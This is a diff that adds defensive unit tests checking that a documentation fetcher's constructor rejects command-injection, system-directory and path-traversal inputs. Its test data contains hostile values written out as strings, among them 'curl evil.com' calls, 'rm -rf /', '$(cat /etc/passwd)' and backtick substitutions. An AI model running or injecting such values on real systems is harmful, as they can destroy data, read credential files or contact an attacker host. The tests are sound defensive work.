@@ -163,4 +163,96 @@ describe('Command Injection Prevention', () => {
       }
     });
   });
+
+  describe('Git Command Injection Prevention (Issue #265 Part 2)', () => {
+    it('should reject malicious paths in constructor with shell metacharacters', () => {
+      const maliciousPaths = [
+        '/tmp/test; touch /tmp/PWNED #',
+        '/tmp/test && curl http://evil.com',
+        '/tmp/test | whoami',
+        '/tmp/test`whoami`',
+        '/tmp/test$(cat /etc/passwd)',
+        '/tmp/test\nrm -rf /',
+        '/tmp/test & rm -rf /',
+        '/tmp/test || curl evil.com',
+      ];
+
+      for (const maliciousPath of maliciousPaths) {
+        expect(() => new EnhancedDocumentationFetcher(maliciousPath)).toThrow(
+          /Invalid docsPath: path contains disallowed characters or patterns/
+        );
+      }
+    });
+
+    it('should reject paths pointing to sensitive system directories', () => {
+      const systemPaths = [
+        '/etc/passwd',
+        '/sys/kernel',
+        '/proc/self',
+        '/var/log/auth.log',
+      ];
+
+      for (const systemPath of systemPaths) {
+        expect(() => new EnhancedDocumentationFetcher(systemPath)).toThrow(
+          /Invalid docsPath: cannot use system directories/
+        );
+      }
+    });
+
+    it('should reject directory traversal attempts in constructor', () => {
+      const traversalPaths = [
+        '../../../etc/passwd',
+        '../../sensitive',
+        './relative/path',
+        '.hidden/path',
+      ];
+
+      for (const traversalPath of traversalPaths) {
+        expect(() => new EnhancedDocumentationFetcher(traversalPath)).toThrow(
+          /Invalid docsPath: path contains disallowed characters or patterns/
+        );
+      }
+    });
+
+    it('should accept valid absolute paths in constructor', () => {
+      // These should not throw
+      expect(() => new EnhancedDocumentationFetcher('/tmp/valid-docs-path')).not.toThrow();
+      expect(() => new EnhancedDocumentationFetcher('/var/tmp/n8n-docs')).not.toThrow();
+      expect(() => new EnhancedDocumentationFetcher('/home/user/docs')).not.toThrow();
+    });
+
+    it('should use default path when no path provided', () => {
+      // Should not throw with default path
+      expect(() => new EnhancedDocumentationFetcher()).not.toThrow();
+    });
+
+    it('should reject paths with quote characters', () => {
+      const quotePaths = [
+        '/tmp/test"malicious',
+        "/tmp/test'malicious",
+        '/tmp/test`command`',
+      ];
+
+      for (const quotePath of quotePaths) {
+        expect(() => new EnhancedDocumentationFetcher(quotePath)).toThrow(
+          /Invalid docsPath: path contains disallowed characters or patterns/
+        );
+      }
+    });
+
+    it('should reject paths with brackets and braces', () => {
+      const bracketPaths = [
+        '/tmp/test[malicious]',
+        '/tmp/test{a,b}',
+        '/tmp/test<redirect>',
+        '/tmp/test(subshell)',
+      ];
+
+      for (const bracketPath of bracketPaths) {
+        expect(() => new EnhancedDocumentationFetcher(bracketPath)).toThrow(
+          /Invalid docsPath: path contains disallowed characters or patterns/
+        );
+      }
+    });
+  });
 });
